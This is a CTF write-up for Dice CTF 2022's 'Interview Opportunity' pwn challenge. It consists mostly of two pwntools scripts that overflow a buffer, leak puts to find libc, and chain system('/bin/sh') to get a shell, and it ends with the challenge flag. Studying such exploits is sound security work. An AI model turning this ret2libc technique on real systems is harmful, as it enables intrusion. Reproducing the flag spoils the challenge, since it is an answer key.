---
name: Interview Opportunity (2022)
event: Dice CTF 2022
category: Pwn
description: Writeup for Interview Opportunity (Pwn) - Dice CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Interview Opportunity

## Challenge Description

> Good luck on your interview...

## Solution

#### manual.py

{% code overflow="wrap" %}
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('?', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './interview-opportunity'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
# libc = ELF('libc-2.3.1.so')  # Remote

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

# Start program
io = start()

# POP RDI from ropper
pop_rdi = 0x401313

# Payload to leak libc function
payload = flat({
    offset: [
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.symbols.main
    ]
})

# Send the payload
io.sendlineafter('?', payload)

io.recvlines(3)  # Receive the newline

# Retrieve got.puts address
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# System(/bin/sh)
info("system_addr: %#x", libc.symbols.system)
bin_sh = next(libc.search(b'/bin/sh\x00'))
info("bin_sh: %#x", bin_sh)

# Payload to get shell
payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        libc.symbols.system
    ]
})

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
```
{% endcode %}

#### ropstar.py

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b'?', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './interview-opportunity'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)  # Local
# libc = ELF('./libc.so.6')  # Remote

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

# Create a ROP object to handle complexities
rop = ROP(elf)

# Payload to leak Lib-C function
rop.puts(elf.got.puts)
rop.main()

# Send the payload
io.sendlineafter('?', flat({offset: rop.chain()}))

# Leak puts()
io.recvlines(3)
got_puts = unpack(io.recvline().strip()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Reset ROP object with libc binary
rop = ROP(libc)

# Call ROP system, passing location of "/bin/sh" string
rop.system(next(libc.search(b'/bin/sh\x00')))

# Send the payload
io.sendline(flat({offset: rop.chain()}))

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}`
